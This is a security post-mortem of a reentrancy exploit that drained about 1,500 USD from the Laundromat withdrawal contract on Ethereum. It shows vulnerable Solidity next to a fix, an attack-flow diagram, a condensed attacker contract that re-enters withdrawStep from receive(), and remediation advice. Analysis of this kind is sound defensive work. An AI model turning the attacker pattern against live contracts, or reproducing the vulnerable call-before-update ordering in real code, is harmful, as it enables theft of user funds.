# Laundromat — Withdrawal Process Reentrancy Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2025-04-08 |
| **Protocol** | Laundromat |
| **Chain** | Ethereum |
| **Loss** | ~1,500 USD |
| **Attacker** | [0xd6be07499d408454d090c96bd74a193f61f706f4](https://etherscan.io/address/0xd6be07499d408454d090c96bd74a193f61f706f4) |
| **Attack Tx** | [0x08ffb5f7...](https://app.blocksec.com/explorer/tx/eth/0x08ffb5f7ab6421720ab609b6ab0ff5622fba225ba351119c21ef92c78cb8302c) |
| **Vulnerable Contract** | [0x934cbbe5377358e6712b5f041d90313d935c501c](https://etherscan.io/address/0x934cbbe5377358e6712b5f041d90313d935c501c) |
| **Root Cause** | Reentrancy possible in the multi-step withdrawal process (withdrawStart → withdrawStep → withdrawFinal) |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-04/Laundromat_exp.sol) |

---

## 1. Vulnerability Overview

The Laundromat protocol processed funds via ETH deposits and a multi-step withdrawal process (`withdrawStart` → `withdrawStep` → `withdrawFinal`). During the multi-step withdrawal, a reentrancy attack was possible by exploiting the ETH transfer callback in intermediate steps. The attacker contract executed the attack from its constructor, repeatedly withdrawing by calling `withdrawStep()` again using ETH received at each step.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable withdrawal process: no reentrancy protection
contract Laundromat {
    mapping(address => uint256) public deposits;
    mapping(address => uint256) public withdrawPhase;

    function withdrawStart(
        uint256[] calldata amounts,
        uint256 a, uint256 b, uint256 c
    ) external {
        // Initiate withdrawal (set phase)
        withdrawPhase[msg.sender] = 1;
    }

    function withdrawStep() external {
        require(withdrawPhase[msg.sender] >= 1);
        // ❌ ETH transfer before state update
        (bool success,) = msg.sender.call{value: STEP_AMOUNT}("");
        // ❌ Reentrancy possible at this point
        withdrawPhase[msg.sender]++; // Update is too late
    }

    function withdrawFinal() external returns (bool) {
        // Finalize withdrawal
    }
}

// ✅ Correct code
function withdrawStep() external nonReentrant { // ✅ Reentrancy protection
    require(withdrawPhase[msg.sender] >= 1);
    withdrawPhase[msg.sender]++; // ✅ Update state first
    (bool success,) = msg.sender.call{value: STEP_AMOUNT}(""); // ✅ Then transfer
}
```

### On-chain Source Code

Source: Sourcify verified

```solidity
// File: Laundromat_decompiled.sol
contract Laundromat {
    function withdrawStart(uint256[] a, uint256 b, uint256 c, uint256 d) external {  // ❌ Vulnerability
        // TODO: decompiled logic not implemented
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker Contract (attack executed from constructor)
  │
  ├─[1]─► Call Laundromat.deposit() (deposit small amount of ETH)
  │
  ├─[2]─► Call Laundromat.withdrawStart([amounts], ...)
  │         └─► Initiate withdrawal process
  │
  ├─[3]─► First call to Laundromat.withdrawStep()
  │         └─► ETH sent to contract → receive() callback triggered
  │                                          │
  ├─[4]◄─────────────────────────────────────┘
  │         └─► Re-enter withdrawStep() from receive()
  │               └─► Receive additional ETH
  │               └─► Recursively repeats...
  │
  ├─[5]─► Call Laundromat.withdrawFinal()
  │
  └─[6]─► Loss: ~1,500 USD
```

## 4. PoC Code (Core Logic + Comments)

```solidity
// 0x2E95CFC93EBb0a2aACE603ed3474d451E4161578
contract AttackerC {
    constructor() {
        // [1] Deposit
        (bool s1,) = Laundromat.call{value: DEPOSIT_AMOUNT}(
            abi.encodeWithSignature("deposit(uint256,uint256)", ...)
        );
        require(s1);

        // [2] Initiate withdrawal
        (bool s2,) = Laundromat.call(
            abi.encodeWithSignature("withdrawStart(uint256[],uint256,uint256,uint256)", ...)
        );
        require(s2);

        // [3] First withdrawStep call (triggers reentrancy chain)
        (bool s3,) = Laundromat.call(
            abi.encodeWithSignature("withdrawStep()")
        );
        require(s3);

        // [6] Final withdrawal
        (bool sf,) = Laundromat.call(
            abi.encodeWithSignature("withdrawFinal()")
        );
        require(sf);
    }

    // Execute reentrancy attack upon receiving ETH
    receive() external payable {
        // [4] Reenter: call additional withdrawStep
        if (address(Laundromat).balance > 0) {
            (bool ss,) = Laundromat.call(
                abi.encodeWithSignature("withdrawStep()")
            );
        }
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|------|
| **Vulnerability Type** | Reentrancy Attack |
| **Attack Technique** | Multi-step reentrancy via ETH transfer callback |
| **DASP Category** | Reentrancy |
| **CWE** | CWE-841: Improper Enforcement of Behavioral Workflow |
| **Severity** | Medium |
| **Attack Complexity** | Medium |

## 6. Remediation Recommendations

1. **Apply ReentrancyGuard**: Apply the `nonReentrant` modifier to all withdrawal-related functions.
2. **CEI Pattern**: Update state variables before making external calls.
3. **Pull Payment Pattern**: Instead of pushing ETH directly, use a pattern where users withdraw funds themselves.

## 7. Lessons Learned

- **Risk of multi-step withdrawals**: In withdrawal processes divided into multiple steps, reentrancy possibilities must be evaluated at each step.
- **Constructor-based attacks**: Attackers can execute the attack from the contract constructor to complicate analysis.
- **Small losses are still worth analyzing for patterns**: Although the loss was $1,500, the same pattern in a larger protocol could cause millions of dollars in damage.